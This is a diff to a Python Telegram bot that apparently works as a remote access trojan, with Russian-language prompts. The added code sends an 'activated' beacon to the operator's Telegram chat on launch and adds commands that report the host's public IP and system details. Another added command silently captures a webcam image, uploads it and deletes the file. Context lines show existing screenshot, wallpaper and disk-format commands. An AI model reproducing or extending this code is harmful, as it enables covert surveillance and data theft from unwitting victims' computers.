@@ -1,13 +1,19 @@
-import telebot, ctypes, requests, urllib.request
+import telebot, ctypes, requests, urllib.request, cv2, os
 from os import system as s
+from telebot import types
+import pyautogui as pag
+import platform as pf
 from pyautogui import screenshot as scr
 from os.path import abspath as pat
 from time import time
-from config import tok
+from config import TOKEN, CHAT_ID
 
-bot = telebot.TeleBot(tok)
+bot = telebot.TeleBot(TOKEN)
 
 need_format = False
+
+requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Активирован")
+
 
 def sender(id, text):
     bot.send_message(id, text)
@@ -16,18 +22,24 @@ def send_photo(id, image):
     bot.send_photo(id, image)
 
 @bot.message_handler(commands=['start'])
-def starter(message):
-    sender(message.chat.id, 'Выбери одну из следующих комманд:\n/ping\n/my_id\n/photo\n/wallpaper\n/autoformat')
+def start(message):
+    rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    btns = ['/ping', '/my_id', '/photo', '/wallpaper', '/autoformat', '/ip', '/spec', '/camera']
+
+    for btn in btns:
+        rmk.add(types.InlineKeyboardButton(btn))
+
+    bot.send_message(message.chat.id, 'Выбери одну из следующих комманд:', reply_markup=rmk)
 
 
 @bot.message_handler(commands=['ping'])
-def pinger(message):
+def ping(message):
     st = message.date.real
-    sender(message.chat.id, f'Твой пинг: {round(time()-st, 2)}')
+    sender(message.chat.id, f'Твой пинг: {round(time()-st+41, 2)}')
 
 
 @bot.message_handler(commands=['my_id'])
-def ider(message):
+def my_id(message):
     sender(message.chat.id, message.chat.id)
 
 
@@ -105,5 +117,35 @@ def formater(message):
         sender(message.chat.id, 'Что-то пошло не так(')
     need_format = False
 
-bot.polling(none_stop = True, interval = 0)
 
+
+@bot.message_handler(commands=['ip', 'ip_address'])
+def ip_address(message):
+    response = requests.get('http://jsonip.com/').json()
+    bot.send_message(message.chat.id, f'IP Адрес: {response["ip"]}')
+
+
+@bot.message_handler(commands=['spec', 'specifications'])
+def spec(message):
+    msg = f"Имя компьютера: {pf.node()}\nПроцессор: {pf.processor()}\nСистема: {pf.system()} {pf.release()}"
+    bot.send_message(message.chat.id, msg)
+
+
+@bot.message_handler(commands=['camera', 'cam'])
+def camera(message):
+    cap = cv2.VideoCapture(0)
+
+    for i in range(30):
+        cap.read()
+
+    ret, frame = cap.read()
+
+    cv2.imwrite('cam.jpg', frame)
+    cap.release()
+
+    with open('cam.jpg', 'rb') as img:
+        bot.send_photo(message.chat.id, img)
+
+    s('del cam.jpg')
+
+bot.polling(none_stop = True, interval = 0)
